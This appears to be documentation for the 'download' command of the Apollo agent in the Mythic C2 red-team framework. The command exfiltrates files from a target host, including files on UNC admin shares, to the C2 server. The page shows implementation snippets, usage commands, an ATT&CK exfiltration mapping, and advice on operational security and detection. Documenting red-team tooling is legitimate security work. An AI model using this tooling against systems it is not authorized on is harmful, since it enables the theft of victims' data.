+++
title = "download"
chapter = false
weight = 103
hidden = false
+++

{{% notice info %}}
Artifacts Generated: File Open
{{% /notice %}}

## Summary
The `download` function transfers a specified file from the target system to the Mythic server for analysis or exfiltration. This command supports both local files and remote files accessible via UNC paths, with automatic hostname resolution and path normalization. The implementation includes comprehensive error handling, artifact generation for audit trails, and integration with Mythic's file management system for secure file transfer and storage.

- **Needs Admin:** False
- **Version:** 3
- **Author:** @djhohnstein

### Arguments
- **path** (String) - Path to the file to download
  - **CLI Name:** path
  - **Display Name:** Path to file to download
  - **Description:** File to download
  - **Required:** True

## Usage
### Example 1: Basic Local File Download
**Command:**
```
download -Path C:\Users\user\Downloads\test.txt
download C:\Users\user\Downloads\test.txt
```
**Output:**
```text
[File downloaded successfully - file_id: abc123def456]
```

### Example 2: UNC Path Download
**Command:**
```
download -Path \\server\share\document.pdf
```
**Output:**
```text
[File downloaded successfully - file_id: def789ghi012]
```

### Example 3: Download with Localhost Alias
**Command:**
```
download -Path \\127.0.0.1\c$\temp\file.txt
download -Path \\localhost\c$\temp\file.txt
```
**Output:**
```text
[File downloaded successfully - file_id: ghi345jkl678]
```

### Example 4: File Not Found Error
**Command:**
```
download -Path C:\nonexistent\file.txt
```
**Output:**
```text
Error: File 'C:\nonexistent\file.txt' does not exist.
```

### Example 5: File Browser Integration
**Interface Action:**
```
From file browser: Actions -> Task a Download
```
**Output:**
```text
[File downloaded via browser interface - file_id: jkl901mno234]
```

## Detailed Summary

The `download` function implements a comprehensive file transfer system with support for local and remote files, automatic path resolution, and secure file management:

### 1. Parameter Processing and Path Handling

The function uses a flexible parameter structure to handle various file path formats:

```csharp
[DataContract]
internal struct DownloadParameters
{
    [DataMember(Name = "file")]
    public string FileName;
    [DataMember(Name = "host")]
    public string Hostname;
}
```

**Parameter Processing**:
* **File Name**: The target file path to download
* **Hostname**: Optional hostname for remote file access
* **Path Normalization**: Converts various path formats to standardized UNC paths
* **Localhost Resolution**: Resolves localhost aliases to actual computer names

### 2. UNC Path Processing and Resolution

The Python handler implements sophisticated UNC path parsing and resolution:

```python
async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
    path = taskData.args.get_arg("path")
    
    if uncmatch := re.match(r"^\\\\(?P<host>[^\\]+)\\(?P<path>.*)$", path):
        taskData.args.add_arg("host", uncmatch.group("host"))
        taskData.args.set_arg("path", uncmatch.group("path"))
    else:
        taskData.args.add_arg("host", "")
        
    if host := taskData.args.get_arg("host"):
        host = host.upper()
        if host == "127.0.0.1" or host.lower() == "localhost":
            host = taskData.Callback.Host
        taskData.args.set_arg("host", host)
```

**UNC Path Features**:
* **Regex Parsing**: Uses regex to extract hostname and path from UNC paths
* **Hostname Extraction**: Separates hostname from file path in UNC format
* **Localhost Resolution**: Converts localhost/127.0.0.1 to actual callback host
* **Case Normalization**: Converts hostnames to uppercase for consistency

### 3. File Browser Integration

The command includes comprehensive file browser integration:

```python
async def parse_dictionary(self, dictionary_arguments):
    if "host" in dictionary_arguments:
        if "full_path" in dictionary_arguments:
            self.add_arg("path", f'\\\\{dictionary_arguments["host"]}\\{dictionary_arguments["full_path"]}')
        elif "path" in dictionary_arguments:
            self.add_arg("path", f'\\\\{dictionary_arguments["host"]}\\{dictionary_arguments["path"]}')
        elif "file" in dictionary_arguments:
            self.add_arg("path", f'\\\\{dictionary_arguments["host"]}\\{dictionary_arguments["file"]}')
```

**Browser Integration Features**:
* **Multiple Path Formats**: Supports full_path, path, and file parameters from browser
* **UNC Construction**: Automatically constructs UNC paths for remote files
* **Default Handling**: Provides default path handling for browser invocations
* **Parameter Flexibility**: Handles various parameter naming conventions

### 4. Core File Reading and Transfer Logic

The C# implementation handles the actual file reading and transfer:

```csharp
public override void Start()
{
    DownloadParameters parameters = _jsonSerializer.Deserialize<DownloadParameters>(_data.Parameters);
    string host = parameters.Hostname;
    
    if (string.IsNullOrEmpty(parameters.Hostname) && !File.Exists(parameters.FileName))
    {
        resp = CreateTaskResponse($"File '{parameters.FileName}' does not exist.", true, "error");
    }
    else
    {
        // Path resolution and file reading logic
        byte[] fileBytes = File.ReadAllBytes(path);
        
        if (_agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, fileBytes,
                parameters.FileName, out string mythicFileId, false, host))
        {
            resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
        }
    }
}
```

**File Transfer Process**:
* **File Existence Check**: Validates file exists before attempting read
* **Complete File Read**: Uses `File.ReadAllBytes()` to read entire file into memory
* **File Manager Integration**: Uses Apollo's FileManager to transfer file to Mythic
* **Mythic File ID**: Returns Mythic's file ID for downloaded file reference

### 5. Hostname Resolution and Localhost Handling

The system includes sophisticated hostname resolution:

```csharp
private static string[] localhostAliases = new string[]
{
    "localhost",
    "127.0.0.1",
    Environment.GetEnvironmentVariable("COMPUTERNAME").ToLower()
};
```

**Localhost Resolution**:
* **Alias Detection**: Recognizes various localhost aliases
* **Computer Name**: Uses actual computer name for localhost references
* **Case Insensitive**: Handles case variations in hostname aliases
* **Environment Variable**: Uses COMPUTERNAME environment variable for resolution

### 6. Current Working Directory UNC Path Handling

The implementation includes special handling for UNC-based working directories:

```csharp
string cwd = System.IO.Directory.GetCurrentDirectory().ToString();
if (cwd.StartsWith("\\\\"))
{
    var hostPieces = cwd.Split('\\');
    if (hostPieces.Length > 2)
    {
        host = hostPieces[2];
        path = $@"\\{hostPieces[2]}\{parameters.FileName}";
    }
    else
    {
        resp = CreateTaskResponse($"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path", true, "error");
    }
}
```

**UNC CWD Features**:
* **UNC Detection**: Detects when current working directory is a UNC path
* **Host Extraction**: Extracts hostname from UNC working directory
* **Path Construction**: Builds proper UNC path for file access
* **Error Handling**: Provides specific error messages for invalid UNC paths

### 7. Artifact Generation and Audit Trail

The command generates comprehensive audit artifacts:

```csharp
IMythicMessage[] artifacts = new IMythicMessage[1]
{
    new Artifact
    {
        BaseArtifact = "FileOpen",
        ArtifactDetails = path
    }
};
```

**Artifact Details**:
* **File Open Artifact**: Records file access with complete path
* **Audit Trail**: Provides forensic evidence of file access
* **Timeline Integration**: Links file access to specific task execution
* **Path Recording**: Records the actual path used for file access

### 8. File Manager Integration and Transfer

The system integrates with Apollo's file management system:

```csharp
if (_agent.GetFileManager().PutFile(_cancellationToken.Token, _data.ID, fileBytes,
        parameters.FileName, out string mythicFileId, false, host))
{
    resp = CreateTaskResponse(mythicFileId, true, "completed", artifacts);
}
```

**File Manager Features**:
* **Secure Transfer**: Uses Apollo's secure file transfer mechanisms
* **Cancellation Support**: Respects cancellation tokens for operation termination
* **File ID Assignment**: Receives Mythic file ID for tracking and reference
* **Host Association**: Associates file with specific host for organization
* **Transfer Validation**: Confirms successful transfer before completing task

### 9. Browser Script Integration and UI Features

The command includes JavaScript browser script for enhanced UI integration:

```javascript
function(task, responses){
    if(responses.length > 0){
        try{
            const task_data = JSON.parse(responses[0]);
            return { "media": [{
                "filename": `${task.display_params}`,
                "agent_file_id": task_data["file_id"],
            }]};
        }catch(error){
            const combined = responses.reduce( (prev, cur) => {
                return prev + cur;
            }, "");
            return {'plaintext': combined};
        }
    }
}
```

**Browser Script Features**:
* **Media Display**: Presents downloaded files as downloadable media in UI
* **File ID Integration**: Links browser display to Mythic file management
* **Error Handling**: Gracefully handles JSON parsing errors
* **Response Aggregation**: Combines multiple response chunks for display

### 10. Error Handling and Exception Management

The implementation includes comprehensive error handling:

**Error Scenarios**:
* **File Not Found**: Reports when target file doesn't exist
* **Access Denied**: Handles permission errors for file access
* **Invalid UNC Paths**: Provides specific errors for malformed UNC paths
* **Transfer Failures**: Reports file transfer failures to Mythic
* **General Exceptions**: Catches and reports unexpected errors with stack traces

**Error Response Formats**:
* File not found: `"File '{filename}' does not exist."`
* Transfer failure: `"Download of {path} failed or aborted."`
* UNC error: `"invalid UNC path for CWD: {cwd}. Can't determine host. Please use explicit UNC path"`

## MITRE ATT&CK Mapping
- **T1020** - Automated Exfiltration
- **T1030** - Data Transfer Size Limits
- **T1041** - Exfiltration Over C2 Channel

## Technical Deep Dive

### File Transfer Architecture

The download command implements a multi-layered file transfer system:

#### Memory-Based Transfer
The implementation reads files completely into memory:
```csharp
byte[] fileBytes = File.ReadAllBytes(path);
```

**Memory Transfer Characteristics**:
- **Complete Read**: Entire file is read into memory at once
- **Memory Constraints**: Limited by available system memory
- **Performance**: Optimized for complete file transfer without streaming
- **Security**: File data remains in managed memory during transfer

#### Apollo File Manager Integration
The transfer leverages Apollo's centralized file management:
- **Secure Transport**: Uses Apollo's secure communication channels
- **File Tracking**: Assigns unique Mythic file IDs for tracking
- **Host Association**: Links files to specific hosts for organization
- **Transfer Validation**: Confirms successful upload to Mythic server

### Path Resolution Algorithm

The command implements sophisticated path resolution:

#### UNC Path Parsing
The regex pattern `^\\\\(?P<host>[^\\]+)\\(?P<path>.*)$` captures:
- **Host Component**: First component after `\\` in UNC path
- **Path Component**: Remaining path after hostname
- **Validation**: Ensures proper UNC path format

#### Localhost Resolution Strategy
Multiple strategies for localhost resolution:
1. **Explicit Aliases**: Matches "localhost" and "127.0.0.1"
2. **Computer Name**: Uses COMPUTERNAME environment variable
3. **Callback Host**: Uses Mythic callback host information for remote resolution

#### Working Directory Context
Special handling for UNC working directories:
- **Detection**: Identifies when CWD is a UNC path
- **Host Extraction**: Parses hostname from UNC CWD
- **Path Construction**: Builds appropriate file paths within UNC context

### Browser Integration Architecture

The command provides comprehensive browser integration:

#### File Browser Support
The `supported_ui_features = ["file_browser:download"]` enables:
- **Context Menu**: Right-click download option in file browser
- **Action Integration**: Seamless integration with file browser actions
- **Path Propagation**: Automatic path parameter population

#### Dictionary Parameter Parsing
Handles multiple parameter formats from browser:
- **full_path**: Complete file path from browser
- **path**: Relative or absolute path
- **file**: Filename with implicit path context
- **host**: Remote host specification

### JavaScript Browser Script

The browser script enhances the user experience:

#### Media Presentation
Successfully downloaded files are presented as media objects:
- **Filename Display**: Shows original filename in UI
- **Download Link**: Provides direct download link from Mythic
- **File ID Tracking**: Links to Mythic's file management system

#### Error Handling
Graceful degradation for various error scenarios:
- **JSON Parsing Errors**: Falls back to plaintext display
- **Empty Responses**: Shows appropriate waiting message
- **Multiple Responses**: Aggregates response content

## APIs Used and Their Purposes
| API | Purpose | DLL | Documentation |
|------|---------|-----|--------------|
| `File.ReadAllBytes()` | Reads complete file content into byte array | mscorlib.dll | [File.ReadAllBytes](https://docs.microsoft.com/en-us/dotnet/api/system.io.file.readallbytes) |
| `File.Exists()` | Validates file existence before reading | mscorlib.dll | [File.Exists](https://docs.microsoft.com/en-us/dotnet/api/system.io.file.exists) |
| `Directory.GetCurrentDirectory()` | Gets current working directory for path resolution | mscorlib.dll | [Directory.GetCurrentDirectory](https://docs.microsoft.com/en-us/dotnet/api/system.io.directory.getcurrentdirectory) |
| `Environment.GetEnvironmentVariable()` | Gets COMPUTERNAME for localhost resolution | mscorlib.dll | [Environment.GetEnvironmentVariable](https://docs.microsoft.com/en-us/dotnet/api/system.environment.getenvironmentvariable) |
| `IAgent.GetFileManager().PutFile()` | Transfers file to Mythic server | Apollo Agent | Internal Apollo API |
| `Regex.Match()` | Parses UNC paths for hostname extraction | System.dll | [Regex.Match](https://docs.microsoft.com/en-us/dotnet/api/system.text.regularexpressions.regex.match) |

## Security Considerations

### File Access Permissions
1. **Windows ACLs**: Respects file system access control lists
2. **User Context**: Limited by Apollo agent's privilege level
3. **Network Access**: UNC paths require appropriate network credentials
4. **Share Permissions**: Network shares enforce their own permission models

### Data Exfiltration Implications
1. **Sensitive Data**: Can exfiltrate any readable file from target system
2. **Audit Trail**: Generates file access artifacts for forensic tracking
3. **Network Traffic**: File transfers generate network traffic to Mythic server
4. **Detection Risk**: Large file transfers may trigger data loss prevention systems

### Operational Security
1. **File Size Limits**: Large files may impact network performance and detection
2. **Access Patterns**: Multiple file downloads may indicate data exfiltration
3. **Timing Considerations**: File access timing may correlate with other activities
4. **Memory Usage**: Large files consume significant memory during transfer

### Defensive Considerations
1. **File System Monitoring**: Monitor for unusual file access patterns
2. **Network Monitoring**: Watch for large data transfers to external systems
3. **Access Logging**: Enable file access auditing for sensitive directories
4. **DLP Systems**: Deploy data loss prevention for sensitive file types

## Limitations

1. **Memory Constraints**: Files must fit entirely in memory during transfer
2. **File Size Limits**: Practical limits based on available memory and network capacity
3. **Permission Requirements**: Cannot download files without read permissions
4. **Network Dependencies**: UNC paths require network connectivity and credentials
5. **Synchronous Operation**: Blocks agent during file reading and transfer
6. **No Resume Capability**: Cannot resume interrupted downloads
7. **Binary Compatibility**: All file types supported but no special handling for specific formats
8. **No Compression**: Files transferred without compression (handled by C2 channel)

## Troubleshooting

### Common Issues and Solutions

| Issue | Possible Causes | Solutions |
|-------|----------------|-----------|
| "File does not exist" | Incorrect path, file deleted | Verify file path with `ls` command |
| Access denied errors | Insufficient permissions | Check file permissions and run with appropriate privileges |
| UNC path failures | Network connectivity, credentials | Verify network access and authentication |
| Transfer failures | Network issues, file locking | Check network connectivity and file usage |
| Memory errors | File too large for available memory | Consider file size and available system memory |

### Debugging Steps
1. **Verify File Existence**: Use `ls` to confirm file exists and is accessible
2. **Check Permissions**: Verify read access to the target file
3. **Test Network Paths**: For UNC paths, verify network connectivity and credentials
4. **Monitor Memory Usage**: Watch system memory during large file transfers
5. **Review File Locks**: Check if file is locked by other processes

### Best Practices
1. **Path Verification**: Always verify file paths before attempting download
2. **Size Awareness**: Be mindful of file sizes and system memory constraints
3. **Permission Planning**: Ensure appropriate permissions before attempting access
4. **Network Considerations**: Test network connectivity for remote files
5. **Operational Security**: Consider detection implications of file access patterns

## References

- [.NET File.ReadAllBytes Method](https://docs.microsoft.com/en-us/dotnet/api/system.io.file.readallbytes)
- [UNC Path Format](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats)
- [Windows File System Security](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-object-access)
- [Data Exfiltration Techniques](https://attack.mitre.org/techniques/T1041/)
- [Apollo Agent Source Code](https://github.com/MythicAgents/Apollo)